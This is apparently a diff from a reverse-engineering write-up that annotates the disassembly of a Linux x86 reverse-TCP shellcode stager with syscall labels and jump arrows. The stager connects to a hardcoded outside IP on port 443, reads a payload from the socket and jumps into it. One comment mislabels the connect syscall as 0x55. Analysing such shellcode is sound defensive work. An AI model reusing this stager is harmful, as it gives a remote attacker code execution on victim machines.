@@ -158,61 +158,61 @@ eax            0x56556000          1448435712
  +-0x0804812b:	jne    0x804811a
    0x0804812d:	push   0xa
    0x0804812f:	pop    esi
-   0x08048130:	xor    ebx,ebx
-   0x08048132:	mul    ebx
-   0x08048134:	push   ebx
-   0x08048135:	inc    ebx
-   0x08048136:	push   ebx
-   0x08048137:	push   0x2
-   0x08048139:	mov    al,0x66
-   0x0804813b:	mov    ecx,esp
-   0x0804813d:	int    0x80                                     ; systemcall
-   0x0804813f:	xchg   edi,eax
-   0x08048140:	pop    ebx
-   0x08048141:	push   0x71365f8d
-   0x08048146:	push   0xbb010002
-   0x0804814b:	mov    ecx,esp
-   0x0804814d:	push   0x66
-   0x0804814f:	pop    eax
-   0x08048150:	push   eax
-   0x08048151:	push   ecx
-   0x08048152:	push   edi
-   0x08048153:	mov    ecx,esp
-   0x08048155:	inc    ebx
-   0x08048156:	int    0x80                                     ;systemcall
-   0x08048158:	test   eax,eax
-   0x0804815a:	jns    0x8048175
-   0x0804815c:	dec    esi
-   0x0804815d:	je     0x804819c
-   0x0804815f:	push   0xa2
-   0x08048164:	pop    eax
-   0x08048165:	push   0x0
-   0x08048167:	push   0x5
-   0x08048169:	mov    ebx,esp
-   0x0804816b:	xor    ecx,ecx
-   0x0804816d:	int    0x80                                     ; systemcall
-   0x0804816f:	test   eax,eax
-   0x08048171:	jns    0x8048130
-   0x08048173:	jmp    0x804819c
-   0x08048175:	mov    dl,0x7
-   0x08048177:	mov    ecx,0x1000
-   0x0804817c:	mov    ebx,esp
-   0x0804817e:	shr    ebx,0xc
-   0x08048181:	shl    ebx,0xc
-   0x08048184:	mov    al,0x7d
-   0x08048186:	int    0x80                                     ; systemcall
-   0x08048188:	test   eax,eax
-   0x0804818a:	js     0x804819c
-   0x0804818c:	pop    ebx
-   0x0804818d:	mov    ecx,esp
-   0x0804818f:	cdq    
-   0x08048190:	mov    dl,0x6a
-   0x08048192:	mov    al,0x3
-   0x08048194:	int    0x80                                     ; systemcall
-   0x08048196:	test   eax,eax
-   0x08048198:	js     0x804819c
-   0x0804819a:	jmp    ecx
-   0x0804819c:	mov    eax,0x1
+  +0x08048130:	xor    ebx,ebx
+  |0x08048132:	mul    ebx
+  |0x08048134:	push   ebx
+  |0x08048135:	inc    ebx
+  |0x08048136:	push   ebx
+  |0x08048137:	push   0x2
+  |0x08048139:	mov    al,0x66
+  |0x0804813b:	mov    ecx,esp
+  |0x0804813d:	int    0x80                                     ; systemcall 0x66 (socketcall)
+  |0x0804813f:	xchg   edi,eax
+  |0x08048140:	pop    ebx
+  |0x08048141:	push   0x71365f8d
+  |0x08048146:	push   0xbb010002
+  |0x0804814b:	mov    ecx,esp
+  |0x0804814d:	push   0x66
+  |0x0804814f:	pop    eax
+  |0x08048150:	push   eax
+  |0x08048151:	push   ecx
+  |0x08048152:	push   edi
+  |0x08048153:	mov    ecx,esp
+  |0x08048155:	inc    ebx
+  |0x08048156:	int    0x80                                     ;systemcall 0x55 (socketcall)
+  |0x08048158:	test   eax,eax
++--0x0804815a:	jns    0x8048175
+| |0x0804815c:	dec    esi
+|+-0x0804815d:	je     0x804819c
+|||0x0804815f:	push   0xa2
+|||0x08048164:	pop    eax
+|||0x08048165:	push   0x0
+|||0x08048167:	push   0x5
+|||0x08048169:	mov    ebx,esp
+|||0x0804816b:	xor    ecx,ecx
+|||0x0804816d:	int    0x80                                     ; systemcall 0xa2 (nanosleep)
+|||0x0804816f:	test   eax,eax
+||+0x08048171:	jns    0x8048130
+|+-0x08048173:	jmp    0x804819c
++->0x08048175:	mov    dl,0x7
+ | 0x08048177:	mov    ecx,0x1000
+ | 0x0804817c:	mov    ebx,esp
+ | 0x0804817e:	shr    ebx,0xc
+ | 0x08048181:	shl    ebx,0xc
+ | 0x08048184:	mov    al,0x7d
+ | 0x08048186:	int    0x80                                     ; systemcall
+ | 0x08048188:	test   eax,eax
+ | 0x0804818a:	js     0x804819c
+ | 0x0804818c:	pop    ebx
+ | 0x0804818d:	mov    ecx,esp
+ | 0x0804818f:	cdq    
+ | 0x08048190:	mov    dl,0x6a
+ | 0x08048192:	mov    al,0x3
+ | 0x08048194:	int    0x80                                     ; systemcall
+ | 0x08048196:	test   eax,eax
+ | 0x08048198:	js     0x804819c
+ | 0x0804819a:	jmp    ecx
+ +-0x0804819c:	mov    eax,0x1
    0x080481a1:	mov    ebx,0x1
    0x080481a6:	int    0x80                                     ; systemcall
    0x080481a8:	xor    ebx,ebx
